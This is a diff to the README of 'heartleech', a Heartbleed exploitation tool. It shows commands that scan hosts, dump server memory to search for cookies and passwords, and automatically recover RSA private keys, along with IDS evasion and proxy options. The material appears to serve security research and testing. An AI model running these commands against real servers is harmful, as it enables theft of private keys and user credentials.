@@ -1,15 +1,18 @@
 heartleech
 ==========
 
-A typical "heartbleed" tool. What makes this different is:
+This is a typical "heartbleed" tool. It can scan for systems vulnerable to the
+bug, and then be used to download them. Some important features:
 
-  - autopwn (`-a`) that does all the steps needed to get private key
-  - post-handshake (encrypted) heartbeats instead of during handshake
-  - evades Snort IDS rules
-  - loops making repeated requests (`-l <loopcount>`)
-  - dumps binary data to file (`-f <filename>`)
-  - IPv4 or IPv6 (`-v <IPver>`)
-  - full 64k heartbleeds
+  - conclusive/inconclusive verdicts as to whether the target is vulnerable
+  - bulk/fast download of heartbleed data into a large files for offline
+    processing
+  - automatic retrieval of private keys with no additional steps
+  - some limited IDS evasion
+  - STARTTLS support
+  - IPv6 support
+  - Tor/Socks5n proxy support
+  - extensive connection diagnostic information
   
 
 #Building#
@@ -47,8 +50,9 @@ is at the same level as the "heartleech" directory). Apparently, configuring
 OpenSSL for one 32/64 bits leaves artifacts behind that disrupt the other
 build, so you need two separate directories to build the two different sizes.
 
-Mac OS X includes OpenSSL/0.9.8, which doesn't support heartbeats. Therefore,
-you need to follow the same steps as above. However, instead of the normal
+Mac OS X includes OpenSSL/0.9.8, which doesn't support heartbeats (Jon Callas
+has an excellent post as to why). Therefore, you need to follow the same steps
+as above for Linux. However, instead of the normal
 "`./config`" command, you have to do "`./Configure darwin64-x86_64-cc`". I 
 just build the 64-bit version, but in theory you should be able to build
 the 32-bit version and even the PowerPC version. If you want to make a
@@ -58,27 +62,51 @@ static library separately, then link them all together.
 
 #Running#
 
-Run like the following:
+Here is an example for scanning:
 
-    ./heartleech www.cloudflarechallenge.com -f challenge.bin
-  
-This will send a million heartbeat requests to the server, which by the way 
-will create a 64-gigabyte file, since each heartbeat is 64KB in size. You can
-then grep that file for cookies, keys, and so on.
+    ./heartleech --scan www.google.com www.cloudflarechallenge.com www.robertgraham.com oa8gs7diyfuahl.com
 
-Or, run like the following
+    --- heartleech/1.0.0e ---
+    from https://github.com/robertdavidgraham/heartleech
+    www.google.com:443: SAFE
+    www.cloudflarechallenge.com:443: VULNERABLE
+    www.robertgraham.com:443: INCONCLUSIVE: TCP connect failed
+    oa8gs7diyfuahl.com:443: INCONCLUSIVE: DNS failed
 
-    ./heartleech www.cloudflarechallenge.com -a
+A big feature of this program is that it is conclusive as to whether a target
+is "SAFE" or "VULNERABLE". Otherwise, the target is marked "INCONCLUSIVE".
+
+
+Here is an example of dumping bleed information:
+
+    ./heartleech www.cloudflarechallenge.com --dump challenge.bin
+
+    --- heartleech/1.0.0e ---
+    from https://github.com/robertdavidgraham/heartleech
+    7091376634 bytes downloaded
+
+In this example, the script keeps reconnecting to the server, dumping more
+and more information, sending up to a million requests. This will download
+many gigabytes of information. The data is dumped to a file for later offline
+analysis. Such analysis will include greping for cookies and passwords,
+or searching for private certificates.
+
+To search an offline file for a private-key, use the following example:
+
+    ./heartleech --cert cloudflare.pem --read challenge.bin
     
-This will automatically search the contents looking for prime factors for RSA
-keys, and if found, rebuilds the private key file for you and exits. Doesn't
-work with non-RSA keys.
+where `challenge.bin` is the file you saved in the previous step, and
+the `cloudflare.pem` is the certificate, which you can grab from your
+browser, using the OpenSSL command-line tool, saving from Wireshark, or
+through some other means.
 
-You can also search existing files gathered by other tools, or even other
-memory dumps that have nothing to do with the heartbleed bug, but which may
-have private keys.
+To automate the last two steps, do the following:
 
-    ./heartleech -c challenge.pem -F scan.binaries
+    ./heartleech www.cloudflarechallenge.com --autopwn
+    
+This will automatically fetch the certificate from the website, then continue
+downloading information until it finds a matching private key within the
+heartbleed information.
 
 
 #Design#
